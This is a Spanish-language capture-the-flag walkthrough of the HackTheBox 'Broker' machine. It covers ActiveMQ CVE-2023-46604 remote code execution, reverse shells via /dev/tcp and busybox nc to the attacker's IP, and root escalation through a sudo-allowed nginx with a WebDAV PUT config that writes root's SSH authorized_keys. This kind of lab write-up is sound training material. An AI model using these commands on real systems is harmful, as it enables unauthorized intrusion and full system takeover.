# Broker - HackTheBox

**Fecha de resolución:** 28 de septiembre de 2026

Máquina Linux, IP 10.129.230.87. Expone un broker Apache ActiveMQ con varios protocolos de mensajería (MQTT, AMQP, STOMP, OpenWire) además de la consola web de administración.

## Reconocimiento

Escaneo completo de puertos:

```
nmap 10.129.230.87 -p- -n -sS -vvv --min-rate 5000 -oG allPorts
```

Puertos abiertos: 22 (SSH), 80 (nginx), 1883 (MQTT), 5672 (AMQP), 8161 (Jetty), 37345 (tcpwrapped), 61613 (STOMP), 61614 (Jetty) y 61616 (ActiveMQ OpenWire). Escaneo de versión sobre esos puertos:

```
nmap -p22,80,1883,5672,8161,37345,61613,61614,61616 10.129.230.87 -sS -n -sCV -oN targets
```

El resultado confirma `ActiveMQ OpenWire transport 5.15.15` en el 61616.

## Enumeración web

Los puertos 80 y 8161 sirven la misma aplicación, protegida con autenticación básica (`realm=ActiveMQRealm`): es la consola de administración de ActiveMQ. Probé credenciales por defecto y `admin:admin` funciona.

Antes de centrarme en la versión de ActiveMQ probé un par de vías que no llevaron a nada:

```
searchsploit jetty
searchsploit -x windows/remote/36318.txt
searchsploit Activemq
gobuster dir -u http://10.129.230.87:61614/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,bak
gobuster dir -u http://10.129.230.87:61614/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,bak --exclude-length 0
curl -v -X TRACE http://10.129.230.87:61614/
```

El exploit de Jetty encontrado con searchsploit es para Windows y no aplica. El gobuster sobre el Jetty del 61614 no encontró rutas útiles (hubo que repetirlo con `--exclude-length 0` para filtrar ruido de respuestas vacías). El método TRACE que nmap marcaba como "potentially risky" tampoco dio nada aprovechable.

Volviendo al dato de la versión:

```
cat nmap/targets | grep activemq
```

ActiveMQ 5.15.15 es vulnerable a CVE-2023-46604, deserialización insegura en el transporte OpenWire que permite ejecución remota de código sin autenticación.

## Explotación (CVE-2023-46604)

Cogí el PoC público de vulhub. El primer intento de `git clone` sobre la URL del subdirectorio del repo no sirve para bajar solo esa carpeta, así que descargué los dos archivos sueltos:

```
wget https://raw.githubusercontent.com/vulhub/vulhub/refs/heads/master/activemq/CVE-2023-46604/poc.py
wget https://raw.githubusercontent.com/vulhub/vulhub/refs/heads/master/activemq/CVE-2023-46604/poc.xml
```

El exploit envía un frame OpenWire al puerto 61616 que le dice al broker que cargue un `poc.xml` remoto como contexto de Spring; ese XML define un bean `ProcessBuilder` que ActiveMQ instancia y ejecuta. Levanté un servidor HTTP para servir el XML:

```
python3 -m http.server
```

Primera ejecución, solo para comprobar que el broker llega a pedir el archivo:

```
python3 poc.py 10.129.230.87 61616 http://10.10.14.224:8000/poc.xml
```

Confirmé la petición GET en el servidor Python, lo que valida la entrega pero no todavía la ejecución de comandos. Para probar RCE de verdad edité `poc.xml` con un bean que lanza un `ping` contra mi IP y repetí el envío con un `tcpdump` escuchando ICMP:

```
sudo tcpdump -i tun0 icmp
python3 poc.py 10.129.230.87 61616 http://10.10.14.224:8000/poc.xml
```

Los echo request/reply confirmaron ejecución de comandos en el broker (`content/rce-test.txt`). Guardé esa versión del XML (`poc.xml.save`) y pasé a intentar una reverse shell.

Generé el payload en base64:

```
echo "bash -i >& /dev/tcp/10.10.14.224/4444 0>&1" | base64
```

y edité `poc.xml` para que el `ProcessBuilder` ejecutara `echo <base64> | base64 -d | bash` como lista de argumentos separados. Con el listener en marcha (`nc -lvnp 4444`) volví a lanzar el exploit y no llegó ninguna conexión: `ProcessBuilder` no invoca una shell, así que los caracteres `|` se pasan como argumentos literales a `echo` en vez de interpretarse como tuberías, y el comando no hace nada útil. Guardé ese intento como `poc2.xml` y cambié de enfoque a un único binario que no necesite pipe para dar shell reversa:

```
busybox nc 10.10.14.224 4444 -e bash
```

Con esa versión de `poc.xml`, el listener en escucha y el exploit relanzado, entró la conexión como `activemq`. Mejoré el TTY:

```
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
export SHELL=bash
```

Flag de usuario en `/home/activemq/user.txt`.

## Escalada a root

```
sudo -l
```

```
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

`activemq` puede lanzar `nginx` como root sin contraseña, con la ruta de configuración libre. Escribí una configuración maliciosa que sirve todo el sistema de archivos por WebDAV con el método PUT habilitado:

```
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
server {
        listen 1339;
        root /;
        autoindex on;
        dav_methods PUT;
}
}
EOF
sudo nginx -c /tmp/nginx_pwn.conf
```

Al arrancar como root, ese nginx tiene permiso de escritura sobre todo `/`, incluido `/root/.ssh`. Generé un par de claves:

```
ssh-keygen
# guardada como "root" / "root.pub"
```

Al subir la clave pública tecleé mal el comando la primera vez (`cur` en vez de `curl`, "command not found"). Corregido, subí `root.pub` como `authorized_keys` de root vía PUT:

```
curl -T root.pub http://localhost:1339/root/.ssh/authorized_keys
chmod 600 root
ssh -i root root@localhost
```

Acceso como root confirmado. Flag en `/root/root.txt`.

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
